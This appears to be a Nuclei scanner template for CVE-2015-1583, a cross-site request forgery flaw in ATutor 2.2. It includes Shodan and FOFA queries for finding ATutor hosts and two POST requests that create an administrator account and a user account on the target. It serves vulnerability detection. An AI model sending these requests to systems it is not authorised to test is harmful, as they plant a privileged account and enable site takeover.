id: CVE-2015-1583

info:
  name: ATutor 2.2 CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: Multiple cross-site request forgery (CSRF) vulnerabilities in ATutor 2.2 allow remote attackers to hijack the authentication of administrators for requests that create an administrator or user account.
  impact: |
    Allows attackers to perform unauthorized actions on behalf of authenticated users
  remediation: |
    Upgrade ATutor to a non-vulnerable version
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2015-1583
    cwe-id: CWE-352
    epss-score: 0.01057
    epss-percentile: 0.84681
    cpe: cpe:2.3:a:atutor:atutor:2.2:*:*:*:*:*:*:*
  metadata:
    vendor: atutor
    product: atutor
    shodan-query: http.html:"Atutor"
    fofa-query: body="atutor"

http:
  - method: POST
    path:
      - "{{BaseURL}}/atutor-2.2/ATutor/mods/_core/users/admins/create.php"

    body: |
      form_password_hidden=ef0f8b6ffb699f90933a3321b00ff6769e018b94&login=csrfadmin99&real_name=csrfadmin99&email=csrfadmin99@admin.com&priv_admin=1&submit=Save

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "admin created successfully"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/atutor-2.2/ATutor/mods/_core/users/create_user.php"

    body: |
      form_password_hidden=ef0f8b6ffb699f90933a3321b00ff6769e018b94&login=csrfuser99&email=csrfuser99@user.com&private_email=1&email2=csrfuser99@user.com&first_name=csrfuser99&last_name=csrfuser99&status=3&submit=Save

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "user created successfully"
        part: body
